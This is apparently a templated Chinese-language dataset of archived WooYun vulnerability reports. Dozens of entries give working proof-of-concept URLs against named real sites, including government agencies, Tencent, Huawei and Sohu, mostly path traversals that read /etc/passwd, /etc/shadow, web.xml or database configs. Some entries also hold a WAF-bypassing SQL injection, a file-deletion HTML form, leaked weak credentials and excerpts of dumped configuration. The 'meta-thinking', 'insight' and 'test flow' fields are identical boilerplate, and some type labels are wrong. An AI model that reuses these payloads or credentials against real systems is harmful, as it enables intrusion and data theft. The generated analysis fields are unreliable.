
**详情**: www.hhws.gov.cn/upload_load/info_download.jsp?down_URL=/upload_load/info_download.jsp没有处理down_URL变量哦。

**POC**: 同上

**绕过**: 直接利用

**修复**: 限制down_URL变量即可！
---

---
### [wooyun-2015-094504] 腾讯某分站目录编辑、源码下载、数据库配置及用户消费记录泄露（6238用户）
**厂商**: 腾讯 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://125.39.241.166:8080/cgi/目录遍历http://125.39.241.166:8080/cgi/cgi.zip源码泄露http://125.39.241.166:8080/cgi/cgi-bin/unistat.sh?date=20150127用户消费记录列表http://qqcgi.82696.com:8080/cgi/cgi-bin/unipay.sh?date=20150128&qq=1854000000消费查询接口

**POC**: 源码

**绕过**: 直接利用

**修复**: 访问控制
---

---
### [wooyun-2013-045118] 安利官方网站任意文件下载
**厂商**: 安利 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.amwaynet.com.cn/onlineTESys/downloadUtil.jsp?fileName=../WEB-INF/web.xml&saveName=web.xml

**POC**: http://www.amwaynet.com.cn/onlineTESys/downloadUtil.jsp?fileName=../WEB-INF/web.xml&saveName=web.xml

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-059397] 苏宁易购某站点随机登录任意用户账号获取敏感信息+任意文件下载
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题1：随机登录任意用户账号获取敏感信息1、首先将浏览器的user agent改成手机类型，如iphone 3.0.如下图2、访问zb.suning.com点击用户中心、我的招标，左上角的用户名会出现变换，无需登录密码、验证码即可查看当前用户的信息。具体见截图：3、测试浏览器版本如下：带M的是chrome 便携移动版本，无需修改user agent参数。问题二：任意文件下载zb.suning.com/bid-web/picView.htm?name=../../../../../../../../../../etc/passwdzb.suning.com/bid-web/picView.htm?name=../../../../../../../../../../etc/hostszb.suning.com/bid-web/picView.htm?name=../../../../../.

**POC**: 已经证明

**绕过**: 直接利用

**修复**: 1、问题出现在台式机浏览器（移动版本）和手机浏览器，此问题随机出现，开发应该知道怎么修复。2、服务器验证，对文件下载路径进行过滤。
---

---
### [wooyun-2012-08730] 某省卫生厅任意文件下载
**厂商**: 某省卫生厅 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.hljwst.gov.cn/Admin/Article/FileLoad.aspx?FileName=%E9%BB%91%E5%8D%AB%E7%A7%91%E5%8F%91%E3%80%942012%E3%80%95120%E5%8F%B7.doc&URL=96b3346e-3648-410d-8a87-fefcc25a252a.doc其中文件下载路径参数URL没有对路径进行必要的限制！

**POC**: http://www.hljwst.gov.cn/Admin/Article/FileLoad.aspx?FileName=1.aspx&URL=../../../Admin/Article/FileLoad.aspxhttp://www.hljwst.gov.cn/Admin/Article/FileLoad.aspx?FileName=1.aspx&URL=../../../Admin/login.aspx.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2015-0141063] 恒热集团文件遍历导致集团总部以及旗下7个子企业员工信息可泄漏（职位+姓名+考勤信息）
**厂商**: 恒热集团 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接图文演示：漏洞所在链接：http://www.qhdhr.com.cn:8081/考勤信息链接：http://www.qhdhr.com.cn:8081/hr_cardshow/其实这个子目录是OA系统的一个子功能，但是因为允许目录遍历导致越权访问：信息包括集团总部和7个子公司：所有员工信息（职位---姓名）：考勤信息：

**POC**: 直接图文演示：漏洞所在链接：http://www.qhdhr.com.cn:8081/考勤信息链接：http://www.qhdhr.com.cn:8081/hr_cardshow/其实这个子目录是OA系统的一个子功能，但是因为允许目录遍历导致越权访问：信息包括集团总部和7个子公司：所有员工信息（职位---姓名）：考勤信息：

**绕过**: 直接利用

**修复**: 设置权限
---

---
### [wooyun-2014-066682] NITC营销系统任意文件下载漏洞
**厂商**: NITC营销系统 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Nitc营销系统http://demo.cnnitc.com/download.php?tfile=\..\..\config.php通过分析源码download.php：只过滤../

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 目录限制
---

---
### [wooyun-2012-013727] j2ee分层架构安全（注册乌云1周年庆祝集锦） -- 新浪
**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://3dmap.house.sina.com.cn/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2015-0107546] 山东教育出版社某弱口令导致数据泄漏，后台泄漏（sa权限）
**厂商**: 山东教育出版社 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ftp弱口令：www.sjs.com.cn    帐号：test   密码：testweb.config文件下载可得：连接数据库：管理员信息：用户信息：另网站弱口令请及时修改，比如：帐号：liucong 密码：123456

**POC**: ftp弱口令：www.sjs.com.cn    帐号：test   密码：testweb.config文件下载可得：连接数据库：另网站弱口令请及时修改，比如：帐号：liucong 密码：123456后台地址：http://www.sjs.com.cn/WebManage/index.htm

**绕过**: 直接利用

**修复**: 删除ftp的test帐号，修改sa密码，修改网站后台所有管理员密码，修改后台登录地址
---

---
### [wooyun-2014-084172] 天地行任意订单取消+短信轰炸+某站备份文件下载(泄露多组数据库配置信息)
**厂商**: 真旅网集团 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、注册处短信轰炸2、任意订单取消注册了两个账号进行说明账号1 测试，下单账号2 wooyuntest 下单取消测试的订单，抓包修改订单id成功取消wooyuntest的账单3、不夜城备份文件下载http://www.10106266.com/www.rar

**POC**: 见上

**绕过**: 直接利用

**修复**: NUll
---

---
### [wooyun-2016-0180048] 皮皮网某处未授权访问涉及大量内部信息（含大量源码\数据库配置等）
**厂商**: 皮皮网 | **年份**: 2016 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://gameuser.pipi.cn:8080/，存在目录遍历，可查看上传文件绝对路径、数据库配置、库文件、支付宝配置文件、大量源码等敏感信息。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置访问权限
---

---
### [wooyun-2015-0145254] 酷我音乐某分站存在任意文件读取
**厂商**: 酷我音乐 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取处http://huodong.kuwo.cn/huodong/st/ActCommentsNewFromDB?dis=/WEB-INF/web.xml%3f&pn=0&subid=142读取web.xml文件

**POC**: 任意文件读取处http://huodong.kuwo.cn/huodong/st/ActCommentsNewFromDB?dis=/WEB-INF/web.xml%3f&pn=0&subid=142读取web.xml文件

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2011-01189] 腾讯产品交流任意文件读取
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 要有support管理员权限才能打开哦

**POC**: http://support.qq.com/cgi-bin/beta2/sec_html?temp=../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2015-0113479] 台湾宜蘭政府某分站任意文件下载
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://tp.e-land.gov.tw/YilanTraffic/download.jsp?FileName=hosts&FilePath=C:\Windows\System32\drivers\etc\hosts

**POC**: # Copyright (c) 1993-2006 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corres

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2012-011509] SpeedCMS任意文件下载读取漏洞
**厂商**: 岩创网络 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://XXX.com/article/file/cid/[cid]/?file=../../../etc/passwd数据库下载地址：?file=../../../../application/config/config.ini.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止../../../../这样的地址即可
---

---
### [wooyun-2014-078032] 硅谷动力某分站配置不当导致文件下载（泄露Oralce账号）
**厂商**: enet.com.cn | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 访问 http://others.enet.com.cn/research/research_result.php下载php文件访问：http://others.enet.com.cn/research/config.php下载数据库配置文件包含用户名密码，环境变量路径等

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止下载php文件
---

---
### [wooyun-2015-0124055] UC浏览器寄生兽漏洞(附支付劫持案例)
**厂商**: UC Mobile | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.定位污染插件支付宝插件07-01 16:06:46.051  19185-19212/? I/IPoison-com.UCMobile﹕ dexPath = /data/data/com.UCMobile/com/alipay/dex/alipay.jar | optimizedDirectory = /data/data/com.UCMobile/com/alipay/odex | libraryPath = /data/data/com.UCMobile/com/alipay/dex/alipay.jarAPk文件:/data/data/com.UCMobile/com/alipay/dex/alipay.jarodex 文件:/data/data/com.UCMobile/com/alipay/odex/alipay.dexso文件:/data/data/com.UCMobile

**POC**: 之后任意使用支付插件的支付行为都会触发劫持,效果如图附带其他可能有问题的插件

**绕过**: 直接利用

**修复**: 1.encode ../2.check plugs load
---

---
### [wooyun-2011-03197] 红客联盟cnhonker任意文件遍历、重要信息泄漏
**厂商**: 红客联盟cnhonker | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://www.cnhonker.com/includeswww.cnhonker.com/includes/database/

**绕过**: 直接利用

**修复**: 关闭目录访问权限
---

---
### [wooyun-2013-025471] 澳门特别行政区政府旅游局任意文件下载
**厂商**: 澳门特别行政区政府旅游局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 澳门特别行政区政府旅游局任意文件下载

**POC**: http://www.macautourism.gov.mo/whatson/common/dfile.php?url=../../../../etc/passwdhttp://www.macautourism.gov.mo/whatson/common/dfile.php?url=../Connections/MGTO_DB.php  mysql帐号密码<?php# FileName="Connection_php_mysql.htm"# Type="MYSQL"# HTTP="true"$hostname_MGTO_DB = "localhost";$database_MGTO_DB = 

**绕过**: 直接利用

**修复**: 你懂得。
---

---
### [wooyun-2015-0115480] 广汽吉奥任意文件下载
**厂商**: 广汽吉奥 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: url: http://**.**.**.**/public/download.jsp?file=../../../../../../../../../../etc/passwd

**POC**: url: http://**.**.**.**/public/download.jsp?file=../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 你们比我更专业·~
---

---
### [wooyun-2013-020320] DoNews任意文件下载
**厂商**: DoNews | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cp.donews.com/autogetarticle/_GetLockPic.php?p=/etc/passwdhttp://cp.donews.com/autogetarticle/_GetLockPic.php?p=/data/htdocs/www.donews.com/liv_global.phphttp://cp.donews.com/autogetarticle/_GetLockPic.php?p=/data/htdocs/www.donews.com/liv_libraries/config.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 应该懂！
---

---
### [wooyun-2016-0186149] 看我是如何沦陷北京天江源各个服务器的(影响深圳燃气、山西燃气、延长石油、大鹏等多个企业系统)
**厂商**: 北京天江源科技有限公司 | **年份**: 2016 | **类型**: 文件包含

**元思考**: 触发信号: 认证接口

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞源于Glassfish的任意文件读取漏洞详见https://**.**.**.**/exploits/39241/**.**.**.**:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/**.**.**.**:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/MySQl**.**.**.**:

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、控制权限2、修改密码3、员工的安全意识啊
---

---
### [wooyun-2014-054170] 吉安市公共资源交易网任意文件下载
**厂商**: 吉安市公共资源交易网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.japrtc.gov.cn/new_info_dowload.jsp?wj=/index.jsphttp://www.japrtc.gov.cn/new_info_dowload.jsp?wj=/new_info_dowload.jsp

**POC**: www.japrtc.gov.cn/new_info_dowload.jsp?wj=/index.jsp

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2011-02795] 中国联通重庆分站任意本地文件下载（ROOT权限）
**厂商**: 中国联通 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于程序上的不严谨造成本地文件的泄露

**POC**: http://www.on165.com/shopadmin/WEB-ROOT/download.jsp?file=../../../../etc/passwd

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0158693] 长城宽带某重要系统源码下载
**厂商**: 长城宽带 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/漏洞存在于这个网站系统。文件下载地址：http://**.**.**.**/wwwroot.rar

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除备份
---

---
### [wooyun-2012-011340] 华为商城任意文件遍历
**厂商**: 华为技术有限公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://browser.vmall.com/agentreport/getLinkImageShow?linkImage=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

**POC**: 100:x:100:101:User for D-BUS:/var/run/dbus:/bin/false101:x:101:102:User for haldaemon:/var/run/hal:/bin/falseat:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashftp:x:40:49:FTP account:/srv/ftp:/bin/bashgames:x:12:100:Games account:/

**绕过**: 直接利用

**修复**: 华为技术员如云...
---

---
### [wooyun-2015-0100565] 绕过各种安全防护成功测试深圳某P2P网站
**厂商**: 深圳市前海融信创投金融服务有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先说下第一道墙：IDC的硬件防火墙nmap扫面用--max-rate 20会被封锁，用--max-rate 5就ok啦，虽然需要时间久点呵呵呵呵，看来防火墙防扫描设置的阈值为每分钟300次以上才block IP无图，no JB再来说说第二道和第三道墙：安全狗+360脚本1、鸡肋SQL注射http://www.360etou.com/hetong/11412772879/a208g.html有老版本的安全狗，替换空格bypass之http://www.360etou.com/hetong/11412772879/a208/**/or/**/extractvalue(1,concat(0x5c,(select/**/user()))).html可惜有360那该死的脚本，没办法用select from语句，形成此鸡肋SQL注射2、从旁站搞发现个同IP网站：http://mnlswsj.com，用

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-065382] 开源Web应用开发工具WebBuilder任意文件读取漏洞
**厂商**: putdb.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 代码中存在方法可以由用户控制路径读取文件：查看数据库，调用此方法的xwl不需要登录验证，没有获取权限的情况下也可以访问：于是，访问这个URL：代码读取文件的的路径，是webbuilder/docs/，先尝试访问该文件夹下文件：http://localhost:8080/wb/main?xwl=13O1AVUENBSF&dir=@index.txt修改dir参数，没有过滤../，比如提交web.xml路径：http://localhost:8080/wb/main?xwl=13O1AVUENBSF&dir=@../../WEB-INF/web.xml再试一个：http://localhost:8080/wb/main?xwl=13O1AVUENBSF&dir=@../../META-INF/context.xml

**POC**: 在WebBuilder官方的在线使用站上测试一下：http://www.putdb.com/main?xwl=13O1AVUENBSF&dir=@../../WEB-INF/web.xmlhttp://www.putdb.com/main?xwl=13O1AVUENBSF&dir=@../../META-INF/context.xml

**绕过**: 直接利用

**修复**: 1.过滤../。2.读取文件时，对目录进行检验。
---

---
### [wooyun-2013-025504] MIS信息系统平台多处越权操作漏洞
**厂商**: 钦州市工程项目全生命周期管理信息系统 | **年份**: 2013 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我在渗透中MIS信息系统平台从来没有接触过，记得我学管理信息系统还是在大二，这次无意间发现并尝试了操作钦州市工程项目全生命周期管理信息系统http://218.21.78.40:7000/这一MIS平台的两个UI界面：http://218.21.78.40:7000/Foundation/easyUI/TabStrip/ShowTabStrip.aspx?TabKey=b02053ba-96ac-44cd-bcb1-6d4a2d4b6919&SkinPath=/Foundation/easyWork/Config/TabStrip.ascxhttp://218.21.78.40:7000/Foundation/easyUI/TabStrip/ShowTabStrip.aspx?TabKey=8d966efa-15c6-44bd-af3d-357c7e121eda&BusinessTreeI

**POC**: 如上，不赘述

**绕过**: 直接利用

**修复**: 对于后台操作应当做以权限控制、防止目录遍历
---

---
### [wooyun-2013-018388] 50cms任意文件删除
**厂商**: 云南力诺科技有限公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这套开源的CMS有两个页面存在这个问题。看看代码就知道了，文件1，SingleUpload.ashx//检查是否登录后上传操作//if (!new ManagePage().IsAdminLogin())//{//    context.Response.Write("{msg: 0, msbox: \"请登录后再进行上传文件！\"}");//    return;//}验证是否登录的代码都被注释掉了，然后下面是一些相关的获取删除文件名的信息的操作：string _refilepath = context.Request.QueryString["ReFilePath"]; //取得返回的对象名称string _delfile = context.Request.Params[_refilepath];UpLoad upFiles = new UpLoad();string msg = u

**POC**: <form action="http://test.50cms.com/tools/SingleUpload.ashx?UpFilePath=FileUpload&ReFilePath=123" method="post" enctype="MULTIPART/FORM-DATA">选择文件：<input type="file" id="file" name="FileUpload"/><br>选择路径：<input type="input" name="123" value="../KindEditor/asp.net/demo.aspx" /><br><input type="submit

**绕过**: 直接利用

**修复**: 别乱让人删除文件啊……而且登录也要限制一下。
---

---
### [wooyun-2015-0164099] 长安保险某系统存在任意文件下载漏洞
**厂商**: 长安责任保险股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统地址：http://ec.ecaic.com/ec/http://ec.ecaic.com/ec/login.do?action=download&fileUrl=%2FWEB-INF/&fileName=web.xml

**POC**: http://ec.ecaic.com/ec/login.do?action=download&fileUrl=%2FWEB-INF%2Fconf%2F&fileName=applicationContext.xmlhttp://ec.ecaic.com/ec/login.do?action=download&fileUrl=%2Fjsp%2Ftuser%2F&fileName=editPassword.jsp

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-083223] 海通国际任意文件下载漏洞（泄漏邮箱与数据库密码）
**厂商**: 海通国际 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.htsec.com.hk/english/include/downloadFile.aspx页面对Name参数没有任何过滤导致任意文件下载漏洞http://www.htsec.com.hk/english/include/downloadFile.aspx?Name=download/../../web.config

**POC**: web.config配置信息

**绕过**: 直接利用

**修复**: 过滤参数Name
---

---
### [wooyun-2014-085845] 中国机械工业集团官网某信息泄露
**厂商**: 中国机械工业集团 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: url:http://www.sinomach.com.cn/web.rar1:备份文件下载2:数据库信息泄漏3：后台未授权访问

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-085509] 某政府采购系统通用型任意文件下载(可下载shadow)
**厂商**: CnCert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 继WooYun: 某政府采购系统通用型任意用户密码获取漏洞任意文件下载漏洞测试发现，目测为系统权限，可下载shadow文件--------------------------------------------------1# 下载web.xml文件http://www.lbzfcg.gov.cn/CmsNewsController.do?method=downFile&fileUrl=../WEB-INF/web.xml&viewName=webhttp://60.171.34.186/CmsNewsController.do?method=downFile&fileUrl=../WEB-INF/web.xml&viewName=webhttp://www.szzfcg.gov.cn/CmsNewsController.do?method=downFile&fileUrl=../WEB-

**POC**: ...

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0142968] 史带财（车）险某系统存在任意文件读取漏洞（疑似某通用理赔管理系统）
**厂商**: 史带财产保险股份有限公司 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在 史带财险的理赔系统http://**.**.**.**/autoclaim/系统长这个样子出问题的链接在http://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp这是一个查看图片并输出到屏幕上的页面所以我们可以这样http://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp?filep=/../../../../../../../../../../../../etc/passwd

**POC**: http://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp?filep=/../../../../../../../../../../../../etc/hostshttp://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp?filep=/../../../../../../../../../../../../home//wls10/.bash_history接着找到网站路径/nfs_ns3300/jingyou/webapp/autoclaim/然后http://**.**.

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2010-0969] Sohu某站点目录遍历和任意代码泄露
**厂商**: Sohu.com | **年份**: 2010 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pic.pp.sohu.com/

**POC**: <%@ page contentType="text/html; charset=GBK" %><%@ page import="com.sohu.photoserver.loadbalance.*, com.sohu.photoserver.upload.util.BeanUtil" %><html><head><title>refresh</title></head><body bgcolor="#ffffff"><h1>服务器分组刷新管理</h1><form method="post" action="refresh.jsp">确认要刷新服务器分组吗？<br><br><input typ

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-011985] 云南住房城乡建设厅任意文件下载漏洞
**厂商**: 云南住房城乡建设厅 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ynjst.gov.cn:83/cjc/editor/down.jsp?file=../../../../../../../etc/shadow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-076871] 金融采购网所属采购平台svn弱口令
**厂商**: 金采网 | **年份**: 2014 | **类型**: 服务弱口令

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

